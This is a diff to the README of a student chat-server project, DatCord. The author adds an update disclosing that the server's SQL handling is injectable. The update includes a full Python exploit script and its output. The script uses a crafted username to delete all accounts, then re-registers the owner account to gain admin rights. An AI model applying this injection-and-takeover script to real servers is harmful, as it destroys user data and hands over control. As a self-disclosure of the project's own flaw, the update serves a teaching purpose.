@@ -2,7 +2,165 @@
 This is a school project for one of my Design classes. This server is a sophisticated secure server using an SQL database to store passwords, along with sha256 password hashing which made passwords more secure. There is a logging system that allows errors and communication between client and server to be displayed, and allows for easier debugging and more. There is also a room system, where people can communicate with each other, as well as a direct messaging system that allows for private messaging.
 
 # 2023 Update - DatCord is not safe to use and has ugly code.
-As I've garnered more wisdom in the scope of computer science and cybersecurity, I decided to test some of the "security" features of DatCord by attempting simple injections. I looked into some of the code involving SQL, and they were injectable. I managed to create a user that can delete every single account (including the DatCord account itself) and then recreate the DatCord account to obtain administrative privilileges on the server. I managed to have to ability to view conversations that I did not have access to, and diminish the functionality of the server. Had it not been for a small unhandled exception (which is still bad practice), overwriting individual values would have been made very easy. 
+As I've garnered more wisdom in the scope of computer science and cybersecurity, I decided to test some of the "security" features of DatCord by attempting simple injections. I looked into some of the code involving SQL, and they were injectable. I managed to create a user that can delete every single account (including the DatCord account itself) and then recreate the DatCord account to obtain administrative privilileges on the server. I managed to have to ability to view conversations that I did not have access to, and diminish the functionality of the server. Had it not been for a small unhandled exception (which is still bad practice), overwriting individual values would have been made very easy. Here's the actuak script:
+```python
+import cryptography.fernet, socket, random, sys, threading
+"""
+#########################################################
+#            DatCord User Deletion Exploit              #
+#         By: DrSquidX (2 years in the future)          #
+#                                                       #
+# The exploit conducts an SQL injection to delete every #
+# existing account and then proceeds to reregister the  #
+# DatCord account to gain administrative privileges on  #
+# the server.                                           #
+#########################################################
+"""
+def initiate_connection():
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(target)
+    banner = s.recv(10240).decode()
+    key = s.recv(10240)
+    login_help_msg = s.recv(102400)
+    session = cryptography.fernet.Fernet(key)
+    return s, banner, key, session, login_help_msg
+def recv():
+    while True:
+        try:
+            msg = s.recv(102400)
+            crypt_msg = session.decrypt(msg)
+            print(crypt_msg.decode(),end="\n[*] Enter your message: ")
+        except KeyboardInterrupt:
+            break
+
+try:
+    target = (sys.argv[1],int(sys.argv[2]))
+except:
+    print("[*] Invalid parameters!\n[*] Example: python3 exploit.py 127.0.0.1 1337")
+    sys.exit()
+
+"""
+######################################################
+# Conducting a SQL Injection to delete every account #
+######################################################
+"""
+s, banner, key, session, login_help_msg = initiate_connection()
+print(f"[*] Connected to DatCord.\n[*] Server banner: {banner}\n\n[*] Encryption key {key}\n")
+
+print("[*] Generating credentials for exploit:")
+uname = "".join(chr(random.randint(65,90)) for x in range(26)) + "'or'1'=='1" # Yep, I know. Textbook injection!
+passw = "".join(chr(random.randint(65,90)) for x in range(26))
+print(f"[*] Username: {uname}\n[*] Password {passw}\n")
+
+s.send(session.encrypt(f"!register {uname} {passw}".encode()))
+
+registered = s.recv(10240)
+client_help_msg = s.recv(10240)
+print("[*] Successfully registered injection account. Conducting global account deletion.\n")
+
+s.send(session.encrypt("!deleteacc".encode()))
+conf = s.recv(10240)
+s.send(session.encrypt("!deleteacc".encode()))
+print("[*] Injection completed. Terminating connection.\n")
+
+"""
+##############################################################
+# Registering the DatCord account to steal the admin account #
+##############################################################
+"""
+s, banner, key, session, login_help_msg = initiate_connection()
+print("[*] Successfully reconnected to DatCord.")
+
+s.send(session.encrypt(f"!register DatCord {passw}".encode()))
+
+registered = s.recv(10240)
+# client_help_msg = s.recv(10240)
+print(f"[*] Successfully registered DatCord account with password {passw}.\n")
+print(f"[*] Exploit completed. Beginning communication with DatCord.")
+s.close()
+
+"""
+##############################################
+# Reconnecting to DatCord to gain privileges #
+##############################################
+"""
+s, banner, key, session, login_help_msg = initiate_connection()
+
+s.send(session.encrypt(f"!login DatCord {passw}".encode()))
+
+thr = threading.Thread(target=recv)
+thr.start()
+
+while True:
+    try:
+        msg = input("[*] Enter your message: ")
+        s.send(session.encrypt(msg.encode()))
+    except KeyboardInterrupt:
+        break
+```
+Below is the exploit in action:
+```[*] Connected to DatCord.
+[*] Server banner: DatCord Server v7.77
+
+[*] Encryption key b'E2gbL9cN6ZKIoAzRR7CpVzgiBEBFEBlNnnez-wnOKKI='
+
+[*] Generating credentials for exploit:
+[*] Username: ELLOCETENESVCNFDLBGKIMNCKA'or'1'=='1
+[*] Password TZPQOCHGIAADMZTBRFHWRBQTUM
+
+[*] Successfully registered injection account. Conducting global account deletion.
+
+[*] Injection completed. Terminating connection.
+
+[*] Successfully reconnected to DatCord.
+[*] Successfully registered DatCord account with password TZPQOCHGIAADMZTBRFHWRBQTUM.
+
+[*] Exploit completed. Beginning communication with DatCord.
+[*] Enter your message:
+[(SERVER)]: Successfully logged in!
+[*] Enter your message:
+[(SERVER)]:
+[+] Regular Commands For This Server:
+[+] !help                                  - Displays this message.
+[+] !dm [user]                             - Opens a DM With the specified User.
+[+] !closedm                               - Closes the DM that you are currently in.
+[+] !reregister [old_pass] [new_pass]      - Changes your current password if you enter the correct one.
+[+] !createroom [room_name] [room_pass]    - Creates a chat room(the password is optional).
+[+] !joinroom [room_name] [room_pass]      - Joins a chat room(the password is optional)
+[+] !leaveroom                             - Leaves the current room you are in.
+[+] !getroomlist                           - Gets the list of all the rooms you are a part of.
+[+] !block [user]                          - Blocks a user(they cannot dm or friend request you).
+[+] !unblock [user]                        - Unblocks a user.
+[+] !friendreq [user]                      - Sends a friend request to the user.
+[+] !friendaccept [user]                   - Accepts a friend request from a user.
+[+] !friendremove [user]                   - Removes a user from your friends list.
+[+] !getrequests                           - Gets a list of all the people who have sent friend requests to you.
+[+] !showonlinefriends                     - Gets a list of all your online friends.
+[+] !showfriendslist                       - Gets your friends list.
+[+] !roomban [user]                        - Bans a user from the chat-room(you need to be room admin).
+[+] !roomunban [user]                      - Unbans a user from the chat-room(you need to be room admin).
+[+] !roomkick [user]                       - Kicks a user from the chat room(they can re-enter with the same password).
+[+] !changeroompass [new_pass]             - Changes the room password for a room(need to be room owner).
+[+] !promoteuser [user]                    - Promotes a user to room-admin(you need to be room admin).
+[+] !demoteuser [user]                     - Demotes a user down to regular room client(you need to be room admin).
+[+] !deleteacc                             - Removes your account from the database(everything except for banlists will be removed from the database).
+[*] Enter your message:
+[(SERVER)]:
+[+] Admin Commands For This Server:
+[+] !unnick                                - Reverts yourname back to the owner account.
+[+] !allipban                              - Toggles whether to ban all incoming IP addresses or not.
+[+] !togglelisten                          - Toggles whether to listen for connections or not.
+[+] !nick [username]                       - Changes your name.
+[+] !ipban [ip_addr]                       - Bans the IP Address specified.
+[+] !ipunban [ip_addr]                     - Unbans the IP Address specified.
+[+] !whitelistip [ip_addr]                 - Whitelists an IP Address(connections from it will be accepted even in DDoS Attack).
+[+] !unwhitelistip [ip_addr]               - Removes an IP from the IP whitelist.
+[+] !broadcast [msg]                       - Broadcasts a message to everyone in the server.
+[+] !ban [user]                            - Bans a user from the server.
+[+] !unban [user]                          - Unbans a user from the server.
+[+] !kick [user]                           - Kicks a user from the server.
+[*] Enter your message:
+```
 
 # Every Feature Included(In a more straightforward way):
 * Secure Password Storage - Every password is stored inside of an SQL Database
